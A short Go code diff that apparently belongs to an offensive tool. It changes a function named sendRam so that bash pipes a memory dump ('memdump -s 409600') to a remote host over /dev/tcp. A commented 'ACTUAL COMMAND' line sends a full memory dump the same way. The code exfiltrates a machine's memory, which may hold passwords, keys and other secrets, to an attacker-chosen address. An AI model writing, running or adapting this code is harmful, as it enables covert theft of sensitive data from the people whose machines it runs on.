@@ -48,7 +48,11 @@ func sendRam(RHOST string, RPORT string) {
 	fmt.Println("[+] Sending RAM dump.")
 
 	// Prepare command
-	cmd := fmt.Sprintf("cat ram.txt > /dev/tcp/%s/%s", RHOST, RPORT)
+	// FOR TESTS O N L Y
+	cmd := fmt.Sprintf("memdump -s 409600 > /dev/tcp/%s/%s", RHOST, RPORT)
+
+	// ACTUAL COMMAND ! ! !
+	//cmd := fmt.Sprintf("memdump > /dev/tcp/%s/%s", RHOST, RPORT)
 
 	// Run command with shell
 	err := exec.Command("bash", "-c", cmd).Run()
